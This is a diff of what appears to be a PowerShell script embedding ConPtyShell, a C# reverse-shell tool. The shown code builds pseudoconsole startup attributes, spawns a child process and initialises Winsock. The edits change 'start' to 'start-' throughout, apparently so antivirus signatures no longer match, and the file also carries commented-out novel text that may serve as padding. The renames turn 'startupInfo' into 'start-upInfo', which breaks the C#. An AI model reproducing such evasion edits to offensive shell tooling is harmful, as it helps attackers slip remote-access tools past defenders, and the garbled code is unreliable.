@@ -1,4 +1,4 @@
-function start
+function start-
 {   
 #“It was red, fire-engine red. It was low, as Steve’s MG was low, but it
 #had none of the chunky look of the yellow car outside. This one was
@@ -1224,20 +1224,20 @@ public static class ConPtyShell
         {
             throw new ConPtyShellException("Could not calculate the number of bytes for the attribute list. " + Marshal.GetLastWin32Error());
         }
-        STARTUPINFOEX startupInfo = new STARTUPINFOEX();
-        startupInfo.StartupInfo.cb = Marshal.SizeOf(startupInfo);
-        startupInfo.lpAttributeList = Marshal.AllocHGlobal(lpSize);
-        success = InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, ref lpSize);
+        STARTUPINFOEX start-upInfo = new STARTUPINFOEX();
+        start-upInfo.StartupInfo.cb = Marshal.SizeOf(start-upInfo);
+        start-upInfo.lpAttributeList = Marshal.AllocHGlobal(lpSize);
+        success = InitializeProcThreadAttributeList(start-upInfo.lpAttributeList, 1, 0, ref lpSize);
         if (!success)
         {
             throw new ConPtyShellException("Could not set up attribute list. " + Marshal.GetLastWin32Error());
         }
-        success = UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
+        success = UpdateProcThreadAttribute(start-upInfo.lpAttributeList, 0, attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
         if (!success)
         {
             throw new ConPtyShellException("Could not set pseudoconsole thread attribute. " + Marshal.GetLastWin32Error());
         }
-        return startupInfo;
+        return start-upInfo;
     }
 
     private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
@@ -1258,8 +1258,8 @@ public static class ConPtyShell
 
     private static PROCESS_INFORMATION CreateChildProcessWithPseudoConsole(IntPtr handlePseudoConsole, string commandLine)
     {
-        STARTUPINFOEX startupInfo = ConfigureProcessThread(handlePseudoConsole, (IntPtr)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE);
-        PROCESS_INFORMATION processInfo = RunProcess(ref startupInfo, commandLine);
+        STARTUPINFOEX start-upInfo = ConfigureProcessThread(handlePseudoConsole, (IntPtr)PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE);
+        PROCESS_INFORMATION processInfo = RunProcess(ref start-upInfo, commandLine);
         return processInfo;
     }
 
@@ -1414,7 +1414,7 @@ public static class ConPtyShell
         CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
         // comment the below function to debug errors
         InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);
-        // init wsastartup stuff for this thread
+        // init wsastart-up stuff for this thread
         InitWSAThread();
         if (conptyCompatible)
         {
